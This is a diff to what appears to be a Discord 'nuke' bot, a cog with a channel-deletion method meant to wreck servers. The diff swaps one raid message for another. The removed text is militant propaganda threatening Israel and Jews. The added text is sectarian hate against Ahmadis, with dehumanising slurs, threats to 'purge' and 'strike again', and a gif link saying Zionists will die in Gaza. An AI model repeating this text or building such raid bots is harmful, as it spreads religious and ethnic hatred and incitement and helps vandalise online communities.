@@ -5,17 +5,26 @@ import asyncio
 class Nuke(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
-        self.message = """**GET NUKED, OH INFIDEL
-YOUR SERVER HAS BEEN DESTROYED BY THE ARMY OF THE FAITHFUL
-LET US PRAY TO ALLAH FOR YOUR RECONCILATION AND REHABILITATION,
-FOR YOU TO BE LEAD ONTO THE STRAIGHT PATH
-https://media.giphy.com/media/j5iRcKIcLBTBBtYG84/giphy.gif
-https://media.giphy.com/media/XD4LwLHnoEyeVFXkvM/giphy.gif
-https://media.giphy.com/media/KZevNwyAE26w8y87b5/giphy.gif
-https://media.giphy.com/media/VDjtZo2p6agfanEYIB/giphy.gif
-https://media.giphy.com/media/WqXmUlf5NK59V0Npda/giphy.gif
-RISE OH SON OF AL QASSAM, AND SAY THESE ARE MY ROCKETS AND IN THEIR RANGE WE TARGET YOU, ISRAEL
-WITH OUR FROGMEN AND OUR MARINE COMMANDOS WE WILL TEACH THE SONS OF THE JEWS, ROUNDS OF STORMINGS**"""
+        self.message = """بمباری کی
+احمدیہ کفر ہیں
+This sad excuse for a server has existed for way too long, promoting and spreading falsehood, "converting" many with some stupid form and leading them to hellfire. We have done you a huge favour, now convert to Sunnism and do tawbah to Allah for your transgression.
+ سرور کے لئے یہ افسوس ناک عذر بہت لمبے عرصے سے موجود ہے ، جھوٹ کو فروغ دینے اور پھیلانے ، بہت سے لوگوں کو کچھ بیوقوف شکل میں "تبدیل" اور جہنم کی طرف لے جا رہا ہے۔ ہم نے آپ پر بہت بڑا احسان کیا ہے ، اب سننیت میں تبدیل ہوجائیں اور آپ کی سرکشی پر اللہ کا توبہ کریں۔
+
+May Allah forgive both you and us, and lead us to the straight path.
+**But spread kufr once again, and we shall strike again.**
+I promise you this.*
+**Islam has won and prevailed, we shall purge those like you from our ummah, as you choose to divide it. Never cross us again, you street shitting toilet worshipping dogs. Your "mahdi" died in his birth place, the toilet. Do not make us remind you of your weakness and gullibleness.**
+الله أكبر
+انتصار الاسلام
+ضد الكفار
+لا اله الا الله محمد رسول الله الاحمدية اعداء التوحيد
+https://media.giphy.com/media/LrFUQDghPpoFRszRIf/giphy.gif
+https://media.discordapp.net/attachments/659164270222639123/677613643390779412/VID_20191125_142634_981_001_1.gif
+https://tenor.com/view/pakistanidance-dangerous-funny-dance-pakistan-gif-9367747
+https://media.discordapp.net/attachments/658439558647775232/659857220175134739/Zionists_You_Will_Die_In_Gaza_1.gif
+https://i.makeagif.com/media/6-14-2015/s3OMdO.gif
+https://tenor.com/view/assad-fake-smile-laugh-gif-13215835
+"""
         self.invites = "https://discord.gg/cbtAzt"
 
     async def delete_channels(self, ctx):
